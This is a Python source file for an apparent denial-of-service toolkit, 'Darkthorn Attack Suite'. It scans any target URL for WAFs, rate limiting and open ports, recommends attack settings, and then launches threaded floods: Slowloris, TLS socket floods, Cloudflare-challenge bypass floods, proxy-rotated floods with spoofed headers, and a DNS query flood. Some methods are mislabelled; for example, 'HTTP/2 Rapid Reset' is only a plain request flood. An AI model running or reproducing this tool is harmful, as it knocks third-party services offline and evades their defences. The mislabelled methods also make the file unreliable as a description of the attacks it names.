
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         DARKTHORN ATTACK SUITE v4.3.0                          ║
║                         Advanced Multi-Vector DoS Toolkit                      ║
║                          + Auto Security Scanner Feature                       ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import re
import json
import time
import random
import socket
import ssl
import threading
import subprocess
import platform
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import defaultdict

try:
    import cloudscraper
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError as e:
    print(f"[!] Missing module: {e}. Run: pip3 install cloudscraper colorama requests")
    sys.exit(1)

# ================================ KONFIGURASI GLOBAL ================================

VERSION = "4.3.0"

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
]

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
░█▀▄░█▀█░█▀▄░█░█░▀█▀░█░█░█▀█░█▀▄░█▀█
░█░█░█▀█░█▀▄░█▀▄░░█░░█▀█░█░█░█▀▄░█░█
░▀▀░░▀░▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀░▀
{Style.RESET_ALL}
{Fore.CYAN}[+] Darkthorn Attack Suite v{VERSION}{Style.RESET_ALL} | {Fore.YELLOW}Multi-Vector DDoS Engine{Style.RESET_ALL}
{Fore.MAGENTA}[+] Auto Security Scanner | Smart Attack Recommendation | Cloudflare Bypass Active{Style.RESET_ALL}
"""

METHODS = {
    "1": ("HTTP/2 Rapid Reset", "http2"),
    "2": ("Slowloris DDoS", "slowloris"),
    "3": ("Socket Flood", "socket"),
    "4": ("Proxy Chain Attack", "proxy"),
    "5": ("Multi-Vector Assault", "multi"),
    "6": ("CF Bypass Engine", "cfbypass"),
    "7": ("SSL Renegotiation", "ssl"),
    "8": ("DNS Amplification", "dns"),
    "9": ("JavaScript Challenge Solver", "js"),
    "10": ("All Methods Combined", "all")
}

# Severity levels
SEVERITY = {
    'critical': Fore.RED + Style.BRIGHT,
    'high': Fore.RED,
    'medium': Fore.YELLOW,
    'low': Fore.GREEN,
    'info': Fore.CYAN
}

stats = {
    "requests_sent": 0,
    "bytes_sent": 0,
    "errors": 0,
    "active_threads": 0,
    "start_time": None
}
stats_lock = threading.Lock()
stop_attack = threading.Event()

def update_stats(sent=0, bytes_sent=0, error=False):
    with stats_lock:
        stats["requests_sent"] += sent
        stats["bytes_sent"] += bytes_sent
        if error:
            stats["errors"] += 1

def status_printer():
    while not stop_attack.is_set():
        if stats["start_time"]:
            elapsed = int(time.time() - stats["start_time"])
            elapsed_str = f"{elapsed // 3600:02d}:{(elapsed % 3600) // 60:02d}:{elapsed % 60:02d}"
        else:
            elapsed_str = "00:00:00"
        
        sys.stdout.write(f"\r{Fore.CYAN}[+] {elapsed_str} | Req: {stats['requests_sent']:,} | "
                        f"Data: {stats['bytes_sent']/1024/1024:.2f} MB | Err: {stats['errors']:,} | "
                        f"Thr: {threading.active_count()}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def get_random_headers(host=None):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'CF-Connecting-IP': get_random_ip(),
        'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'JP', 'KR', 'SG', 'AU']),
        'CF-Visitor': '{"scheme":"https"}',
        'X-Forwarded-For': get_random_ip(),
        'X-Real-IP': get_random_ip(),
        'True-Client-IP': get_random_ip()
    }
    if host:
        headers['Host'] = host
    return headers

# ================================ AUTO SECURITY SCANNER ================================

class SecurityScanner:
    def __init__(self, target_url, target_host, target_port):
        self.target_url = target_url
        self.target_host = target_host
        self.target_port = target_port
        self.findings = []
        self.scan_results = {}
        
    def check_http_headers(self):
        """Check HTTP security headers"""
        findings = []
        try:
            resp = requests.get(self.target_url, timeout=10, verify=False, allow_redirects=True)
            headers = resp.headers
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'X-XSS-Protection': 'XSS protection',
                'Content-Security-Policy': 'CSP implementation',
                'Strict-Transport-Security': 'HSTS',
                'Referrer-Policy': 'Referrer policy'
            }
            
            for header, desc in security_headers.items():
                if header in headers:
                    findings.append({'severity': 'low', 'title': f'{desc} present', 'detail': f'{header}: {headers[header]}'})
                else:
                    findings.append({'severity': 'medium', 'title': f'{desc} missing', 'detail': f'Header {header} not found'})
            
            # Check server info leak
            if 'Server' in headers:
                findings.append({'severity': 'medium', 'title': 'Server info leaked', 'detail': f'Server: {headers["Server"]}'})
            
            return findings
        except Exception as e:
            return [{'severity': 'info', 'title': 'Header check failed', 'detail': str(e)}]
    
    def check_waf_cdn(self):
        """Detect WAF/CDN protection"""
        findings = []
        try:
            # Check for Cloudflare
            resp = requests.get(self.target_url, timeout=10, verify=False)
            headers = resp.headers
            cf_headers = ['CF-RAY', 'CF-Cache-Status', 'Cloudflare', '__cfduid']
            for cf in cf_headers:
                if cf in headers or cf.lower() in str(headers).lower():
                    findings.append({'severity': 'critical', 'title': 'Cloudflare WAF/CDN Detected', 
                                   'detail': 'Protected by Cloudflare - requires bypass techniques'})
                    self.scan_results['waf_type'] = 'cloudflare'
                    break
            
            # Check for other WAFs
            waf_signatures = {
                'Akamai': ['AkamaiGHost', 'X-Akamai-Transformed'],
                'AWS WAF': ['x-amzn-RequestId', 'AWSALB'],
                'Sucuri': ['X-Sucuri-ID', 'X-Sucuri-Cache'],
                'Incapsula': ['X-CDN', 'X-Iinfo'],
                'ModSecurity': ['Mod_Security', 'NOYB'],
                'Imperva': ['X-Conditional-Request', 'X-Request-ID']
            }
            
            for waf, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig in headers or sig.lower() in str(headers).lower():
                        findings.append({'severity': 'high', 'title': f'{waf} WAF Detected', 
                                       'detail': f'Protected by {waf} web application firewall'})
                        self.scan_results['waf_type'] = waf
                        break
            
            if 'cf_bypass' in self.scan_results:
                findings.append({'severity': 'high', 'title': 'Cloudflare detected - Need JS solver', 
                               'detail': 'Use method 6 (CF Bypass Engine) or method 9 (JS Solver)'})
            
            return findings
        except Exception as e:
            return [{'severity': 'info', 'title': 'WAF detection failed', 'detail': str(e)}]
    
    def check_rate_limiting(self):
        """Test if rate limiting is implemented"""
        findings = []
        success_count = 0
        block_count = 0
        
        try:
            for i in range(20):
                resp = requests.get(self.target_url, timeout=5, verify=False)
                if resp.status_code in [429, 403, 503]:
                    block_count += 1
                elif resp.status_code == 200:
                    success_count += 1
                time.sleep(0.1)
            
            if block_count >= 15:
                findings.append({'severity': 'high', 'title': 'Rate limiting detected', 
                               'detail': f'{block_count}/20 requests blocked - Need rotating proxies'})
                self.scan_results['rate_limited'] = True
            elif block_count >= 5:
                findings.append({'severity': 'medium', 'title': 'Weak rate limiting detected', 
                               'detail': f'{block_count}/20 requests blocked'})
                self.scan_results['rate_limited'] = True
            else:
                findings.append({'severity': 'low', 'title': 'No rate limiting detected', 
                               'detail': 'Server allows high frequency requests'})
                self.scan_results['rate_limited'] = False
        except:
            findings.append({'severity': 'info', 'title': 'Rate limit check failed', 'detail': 'Could not determine rate limiting'})
        
        return findings
    
    def check_response_time(self):
        """Measure server response time"""
        times = []
        try:
            for i in range(10):
                start = time.time()
                resp = requests.get(self.target_url, timeout=10, verify=False)
                elapsed = time.time() - start
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            self.scan_results['avg_response_time'] = avg_time
            
            if avg_time < 0.1:
                severity = 'low'
                detail = f'Very fast response ({avg_time*1000:.2f}ms) - Highly optimized server'
            elif avg_time < 0.5:
                severity = 'low'
                detail = f'Fast response ({avg_time*1000:.2f}ms) - Good performance'
            elif avg_time < 1.0:
                severity = 'medium'
                detail = f'Slow response ({avg_time*1000:.2f}ms) - Potentially weak server'
            else:
                severity = 'high'
                detail = f'Very slow response ({avg_time*1000:.2f}ms) - Server may be overloaded'
            
            return [{'severity': severity, 'title': 'Server response time', 'detail': detail}]
        except:
            return [{'severity': 'info', 'title': 'Response time check failed', 'detail': 'Could not measure'}] 
    
    def check_open_ports(self):
        """Scan for open ports"""
        findings = []
        common_ports = [80, 443, 8080, 8443, 22, 21, 3306, 5432, 6379, 27017]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target_host, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        if open_ports:
            findings.append({'severity': 'high', 'title': 'Open ports detected', 
                           'detail': f'Open ports: {open_ports} - Potential attack vectors'})
            self.scan_results['open_ports'] = open_ports
        
        return findings
    
    def check_ssl_tls(self):
        """Check SSL/TLS configuration"""
        findings = []
        if self.target_port == 443 or self.target_url.startswith('https'):
            try:
                context = ssl.create_default_context()
                with socket.create_connection((self.target_host, self.target_port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        
                        findings.append({'severity': 'low', 'title': 'SSL/TLS Certificate found', 
                                       'detail': f'Cipher: {cipher[0]}'})
                        self.scan_results['ssl_available'] = True
            except Exception as e:
                findings.append({'severity': 'high', 'title': 'SSL/TLS issue detected', 
                               'detail': f'Could not establish secure connection: {str(e)[:50]}'})
                self.scan_results['ssl_available'] = False
        else:
            findings.append({'severity': 'info', 'title': 'SSL/TLS not used', 
                           'detail': 'Target uses HTTP - No encryption'})
        
        return findings
    
    def detect_technologies(self):
        """Detect web technologies used"""
        findings = []
        try:
            resp = requests.get(self.target_url, timeout=10, verify=False)
            html = resp.text.lower()
            headers = resp.headers
            
            tech_signatures = {
                'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                'Nginx': ['nginx'] + ([headers.get('Server', '').lower()] if 'nginx' in headers.get('Server', '').lower() else []),
                'Apache': ['apache'] + ([headers.get('Server', '').lower()] if 'apache' in headers.get('Server', '').lower() else []),
                'Laravel': ['laravel', 'csrf-token'],
                'React': ['react', 'react-dom'],
                'Vue.js': ['vue.js', 'data-v-'],
                'jQuery': ['jquery'],
                'Bootstrap': ['bootstrap'],
            }
            
            detected = []
            for tech, signatures in tech_signatures.items():
                for sig in signatures:
                    if sig in html or sig in str(headers).lower():
                        detected.append(tech)
                        break
            
            if detected:
                findings.append({'severity': 'low', 'title': 'Technologies detected', 
                               'detail': f'Detected: {", ".join(set(detected))}'})
            self.scan_results['technologies'] = list(set(detected))
            
            return findings
        except:
            return [{'severity': 'info', 'title': 'Tech detection failed', 'detail': 'Could not detect technologies'}]
    
    def full_scan(self):
        """Run complete security scan"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] STARTING SECURITY SCAN ON {self.target_url}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        scan_modules = [
            ('HTTP Headers', self.check_http_headers),
            ('WAF/CDN Detection', self.check_waf_cdn),
            ('Rate Limiting', self.check_rate_limiting),
            ('Response Time', self.check_response_time),
            ('Open Ports', self.check_open_ports),
            ('SSL/TLS', self.check_ssl_tls),
            ('Technologies', self.detect_technologies)
        ]
        
        all_findings = []
        
        for module_name, module_func in scan_modules:
            print(f"{Fore.YELLOW}[*] Scanning: {module_name}...{Style.RESET_ALL}")
            findings = module_func()
            all_findings.extend(findings)
            for f in findings:
                severity_color = SEVERITY.get(f['severity'], Fore.WHITE)
                print(f"  {severity_color}[{f['severity'].upper()}] {f['title']}{Style.RESET_ALL}")
                print(f"      {f['detail'][:100]}")
            print()
        
        self.findings = all_findings
        self.scan_results['total_findings'] = len(all_findings)
        
        # Count by severity
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for f in all_findings:
            severity_counts[f['severity']] = severity_counts.get(f['severity'], 0) + 1
        
        print(f"{Fore.CYAN}{'='*60}")
        print(f"[+] SCAN COMPLETE")
        print(f"    Critical: {severity_counts['critical']} | High: {severity_counts['high']} | Medium: {severity_counts['medium']} | Low: {severity_counts['low']} | Info: {severity_counts['info']}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        return self.scan_results
    
    def get_recommendations(self):
        """Generate attack recommendations based on scan results"""
        recommendations = []
        
        # WAF/CDN recommendations
        waf_type = self.scan_results.get('waf_type')
        if waf_type == 'cloudflare':
            recommendations.append({
                'method': '6',
                'method_name': 'CF Bypass Engine',
                'reason': 'Cloudflare detected - This method uses JavaScript challenge solver',
                'threads': 800,
                'duration': '60'
            })
            recommendations.append({
                'method': '9',
                'method_name': 'JavaScript Challenge Solver',
                'reason': 'Alternative Cloudflare bypass with dedicated JS engine',
                'threads': 600,
                'duration': '60'
            })
        elif waf_type:
            recommendations.append({
                'method': '1',
                'method_name': 'HTTP/2 Rapid Reset',
                'reason': f'{waf_type} detected - HTTP/2 attacks can bypass some WAF rules',
                'threads': 1000,
                'duration': '60'
            })
        
        # Rate limiting recommendations
        if self.scan_results.get('rate_limited'):
            recommendations.append({
                'method': '4',
                'method_name': 'Proxy Chain Attack',
                'reason': 'Rate limiting detected - Rotating proxies bypass IP-based restrictions',
                'threads': 500,
                'duration': '90'
            })
        
        # Slow response time recommendations
        avg_time = self.scan_results.get('avg_response_time', 0)
        if avg_time > 1.0:
            recommendations.append({
                'method': '2',
                'method_name': 'Slowloris DDoS',
                'reason': f'Slow server response ({avg_time*1000:.0f}ms) - Slowloris keeps connections open',
                'threads': 1500,
                'duration': '45'
            })
        
        # SSL available recommendations
        if self.scan_results.get('ssl_available'):
            recommendations.append({
                'method': '7',
                'method_name': 'SSL Renegotiation',
                'reason': 'SSL/TLS enabled - Can trigger expensive crypto operations',
                'threads': 800,
                'duration': '60'
            })
        
        # Open ports recommendations
        open_ports = self.scan_results.get('open_ports', [])
        if 3306 in open_ports or 5432 in open_ports:
            recommendations.append({
                'method': '3',
                'method_name': 'Socket Flood',
                'reason': f'Database port {3306 if 3306 in open_ports else 5432} open - Direct socket attacks possible',
                'threads': 2000,
                'duration': '60'
            })
        
        # Default recommendations
        if len(recommendations) == 0:
            recommendations.append({
                'method': '5',
                'method_name': 'Multi-Vector Assault',
                'reason': 'No specific vulnerabilities found - Combined attack is most effective',
                'threads': 1500,
                'duration': '60'
            })
            recommendations.append({
                'method': '10',
                'method_name': 'All Methods Combined',
                'reason': 'Maximum pressure - All attack vectors simultaneously',
                'threads': 0,  # Handled internally
                'duration': '60'
            })
        
        return recommendations
    
    def display_recommendations(self):
        """Display attack recommendations to user"""
        recommendations = self.get_recommendations()
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}{'='*60}")
        print(f"[+] ATTACK RECOMMENDATIONS BASED ON SCAN RESULTS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        for i, rec in enumerate(recommendations[:3], 1):  # Show top 3
            print(f"{Fore.CYAN}[{i}] Method: {rec['method_name']} (ID: {rec['method']}){Style.RESET_ALL}")
            print(f"    {Fore.YELLOW}→ Reason: {rec['reason']}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}→ Recommended: Threads={rec['threads']}, Duration={rec['duration']}s{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}[?] Do you want to use recommended settings? (y/n){Style.RESET_ALL}")
        return recommendations

# ================================ METODE ATTACK (SAMA SEPERTI SEBELUMNYA) ================================

class CloudflareScraperAttack:
    @staticmethod
    def attack(target_url, threads=500, duration=None):
        scraper = cloudscraper.create_scraper(interpreter='js', delay=8)
        
        def worker():
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    for _ in range(50):
                        if stop_attack.is_set():
                            break
                        resp = scraper.get(target_url, headers=headers, timeout=5, verify=False)
                        update_stats(sent=1, bytes_sent=len(resp.content))
                        scraper.post(target_url, headers=headers, data={'x'*5000}, timeout=5, verify=False)
                        update_stats(sent=1, bytes_sent=5000)
                except Exception:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class SlowlorisAttack:
    @staticmethod
    def attack(target_host, target_port=80, threads=1000):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            try:
                sock.connect((target_host, target_port))
                sock.send(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_host}\r\n".encode())
                sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                sock.send("Accept-language: en-US,en\r\n".encode())
                
                while not stop_attack.is_set():
                    sock.send(f"X-Header-{random.randint(0, 5000)}: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(random.uniform(5, 15))
            except:
                update_stats(error=True)
            finally:
                sock.close()
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class SocketFloodAttack:
    @staticmethod
    def attack(target_host, target_port=443, threads=1500):
        def worker():
            while not stop_attack.is_set():
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                    ssl_sock.connect((target_host, target_port))
                    
                    payload = f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n{'A'*1024}\r\n".encode()
                    ssl_sock.send(payload)
                    update_stats(sent=1, bytes_sent=len(payload))
                    ssl_sock.close()
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class ProxyChainAttack:
    @staticmethod
    def attack(target_url, proxy_file="proxies.txt", threads=200):
        proxies = []
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        
        if not proxies:
            print(f"{Fore.RED}[!] No proxies found in {proxy_file}. Using direct connection.{Style.RESET_ALL}")
            proxies = [None]
        
        def worker(proxy):
            scraper = cloudscraper.create_scraper()
            proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    resp = scraper.get(target_url, headers=headers, proxies=proxy_dict, timeout=5, verify=False)
                    update_stats(sent=1, bytes_sent=len(resp.content))
                except:
                    update_stats(error=True)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(worker, proxies * (threads // len(proxies) + 1))

class MultiVectorAttack:
    @staticmethod
    def attack(target_url, target_host, port, threads=2000):
        scraper = cloudscraper.create_scraper()
        
        def http_worker():
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers(target_host)
                    scraper.get(target_url, headers=headers, timeout=4)
                    update_stats(sent=1)
                except:
                    update_stats(error=True)
        
        def socket_worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target_host, port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n".encode())
                    sock.close()
                    update_stats(sent=1)
                except:
                    pass
        
        for _ in range(threads // 2):
            threading.Thread(target=http_worker, daemon=True).start()
            threading.Thread(target=socket_worker, daemon=True).start()

class CFBypassAttack:
    @staticmethod
    def attack(target_url, threads=800):
        scraper = cloudscraper.create_scraper(interpreter='js', delay=12)
        
        def worker():
            session = requests.Session()
            retry = Retry(total=3, backoff_factor=1)
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    resp = scraper.get(target_url, headers=headers, timeout=8, verify=False)
                    update_stats(sent=1, bytes_sent=len(resp.content))
                    
                    if '__cfduid' in scraper.cookies:
                        headers['Cookie'] = f"__cfduid={scraper.cookies['__cfduid']}"
                    
                    for _ in range(20):
                        if stop_attack.is_set():
                            break
                        scraper.post(target_url, data={'cf_challenge': 'bypass'*500}, headers=headers, timeout=5)
                        update_stats(sent=1, bytes_sent=500)
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class SSLRenegotiationAttack:
    @staticmethod
    def attack(target_host, target_port=443, threads=500):
        def worker():
            while not stop_attack.is_set():
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                    ssl_sock.connect((target_host, target_port))
                    
                    for _ in range(10):
                        ssl_sock.sendall(b"R" * 16384)
                        update_stats(sent=1, bytes_sent=16384)
                    
                    ssl_sock.close()
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class DNSAmplificationAttack:
    @staticmethod
    def attack(target_host, dns_servers=None, threads=300):
        if not dns_servers:
            dns_servers = ['8.8.8.8', '1.1.1.1', '8.8.4.4', '208.67.222.222', '208.67.220.220']
        
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    packet = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                    packet += b'\x03www\x07' + target_host.encode() + b'\x00\x00\x01\x00\x01'
                    sock.sendto(packet, (random.choice(dns_servers), 53))
                    update_stats(sent=1, bytes_sent=len(packet))
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

class JSSolverAttack:
    @staticmethod
    def attack(target_url, threads=400):
        scraper = cloudscraper.create_scraper(interpreter='js', delay=5, browser={
            'browser': 'chrome',
            'platform': 'windows',
            'desktop': True
        })
        
        def worker():
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    resp = scraper.get(target_url, headers=headers, timeout=10, verify=False)
                    update_stats(sent=1, bytes_sent=len(resp.content))
                    time.sleep(0.1)
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

def all_methods_combined(target_url, target_host, port):
    def run_cloudflare():
        CloudflareScraperAttack.attack(target_url, threads=200)
    
    def run_slowloris():
        SlowlorisAttack.attack(target_host, target_port=port, threads=200)
    
    def run_socket():
        SocketFloodAttack.attack(target_host, target_port=port, threads=200)
    
    def run_cfbypass():
        CFBypassAttack.attack(target_url, threads=200)
    
    def run_multi():
        MultiVectorAttack.attack(target_url, target_host, port, threads=200)
    
    threading.Thread(target=run_cloudflare, daemon=True).start()
    threading.Thread(target=run_slowloris, daemon=True).start()
    threading.Thread(target=run_socket, daemon=True).start()
    threading.Thread(target=run_cfbypass, daemon=True).start()
    threading.Thread(target=run_multi, daemon=True).start()

# ================================ UTILITY ================================

def setup_proxies():
    print(f"{Fore.YELLOW}[*] Fetching proxy list...{Style.RESET_ALL}")
    proxy_urls = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http"
    ]
    
    all_proxies = set()
    for url in proxy_urls:
        try:
            resp = requests.get(url, timeout=10)
            for line in resp.text.splitlines():
                if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line.strip()):
                    all_proxies.add(line.strip())
        except:
            pass
    
    with open("proxies.txt", "w") as f:
        f.write("\n".join(all_proxies))
    
    print(f"{Fore.GREEN}[+] Loaded {len(all_proxies)} proxies{Style.RESET_ALL}")

def banner():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print(BANNER)

def main():
    banner()
    
    print(f"{Fore.YELLOW}[?] Target URL (https://example.com):{Style.RESET_ALL}")
    target_input = input(f"{Fore.GREEN}>>> {Style.RESET_ALL}").strip()
    
    if not target_input.startswith(('http://', 'https://')):
        target_input = 'https://' + target_input
    
    parsed = urlparse(target_input)
    target_host = parsed.netloc.split(':')[0]
    target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    target_url = f"{parsed.scheme}://{target_host}:{target_port}{parsed.path or '/'}"
    
    print(f"\n{Fore.CYAN}[+] Target: {target_url}")
    print(f"[+] Host: {target_host} | Port: {target_port}{Style.RESET_ALL}\n")
    
    # ========== AUTO SECURITY SCAN ==========
    print(f"{Fore.MAGENTA}[?] Perform automatic security scan before attack? (recommended){Style.RESET_ALL}")
    scan_choice = input(f"{Fore.GREEN}>>> (y/n): {Style.RESET_ALL}").strip().lower()
    
    use_recommendations = False
    recommended_method = None
    recommended_threads = None
    recommended_duration = None
    
    if scan_choice == 'y':
        scanner = SecurityScanner(target_url, target_host, target_port)
        scan_results = scanner.full_scan()
        recommendations = scanner.display_recommendations()
        
        if recommendations:
            use_rec = input(f"{Fore.GREEN}>>> (y/n): {Style.RESET_ALL}").strip().lower()
            if use_rec == 'y':
                use_recommendations = True
                best_rec = recommendations[0]
                recommended_method = best_rec['method']
                recommended_threads = best_rec['threads']
                recommended_duration = best_rec['duration']
                print(f"{Fore.GREEN}[+] Using recommended settings: Method {best_rec['method_name']}, Threads={recommended_threads}, Duration={recommended_duration}s{Style.RESET_ALL}\n")
    
    # ========== METHOD SELECTION ==========
    if use_recommendations and recommended_method:
        method_choice = recommended_method
        print(f"{Fore.GREEN}[+] Auto-selected method: {method_choice}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[+] Available Attack Methods:{Style.RESET_ALL}")
        for key, (name, _) in METHODS.items():
            print(f"  {Fore.GREEN}{key}.{Style.RESET_ALL} {name}")
        
        method_choice = input(f"\n{Fore.GREEN}[?] Select method (1-10):{Style.RESET_ALL} ").strip()
    
    if method_choice not in METHODS:
        print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
        return
    
    method_name, method_key = METHODS[method_choice]
    
    # ========== THREADS SELECTION ==========
    if use_recommendations and recommended_threads:
        threads = recommended_threads
        print(f"{Fore.GREEN}[+] Auto-selected threads: {threads}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[?] Number of threads (default 500):{Style.RESET_ALL}")
        threads_input = input(f"{Fore.GREEN}>>> {Style.RESET_ALL}").strip()
        threads = int(threads_input) if threads_input.isdigit() else 500
    
    # ========== DURATION SELECTION ==========
    if use_recommendations and recommended_duration:
        duration = int(recommended_duration)
        print(f"{Fore.GREEN}[+] Auto-selected duration: {duration} seconds{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[?] Duration in seconds (0 = infinite):{Style.RESET_ALL}")
        duration_input = input(f"{Fore.GREEN}>>> {Style.RESET_ALL}").strip()
        duration = int(duration_input) if duration_input.isdigit() else 0
    
    if method_key in ["proxy", "all"]:
        setup_proxies()
    
    print(f"\n{Fore.RED}{Style.BRIGHT}[!] ATTACK STARTING - PRESS CTRL+C TO STOP{Style.RESET_ALL}\n")
    
    stats["start_time"] = time.time()
    threading.Thread(target=status_printer, daemon=True).start()
    
    if method_key == "http2":
        CloudflareScraperAttack.attack(target_url, threads, duration)
    elif method_key == "slowloris":
        SlowlorisAttack.attack(target_host, target_port, threads)
    elif method_key == "socket":
        SocketFloodAttack.attack(target_host, target_port, threads)
    elif method_key == "proxy":
        ProxyChainAttack.attack(target_url, "proxies.txt", threads)
    elif method_key == "multi":
        MultiVectorAttack.attack(target_url, target_host, target_port, threads)
    elif method_key == "cfbypass":
        CFBypassAttack.attack(target_url, threads)
    elif method_key == "ssl":
        SSLRenegotiationAttack.attack(target_host, target_port, threads)
    elif method_key == "dns":
        DNSAmplificationAttack.attack(target_host, threads=threads)
    elif method_key == "js":
        JSSolverAttack.attack(target_url, threads)
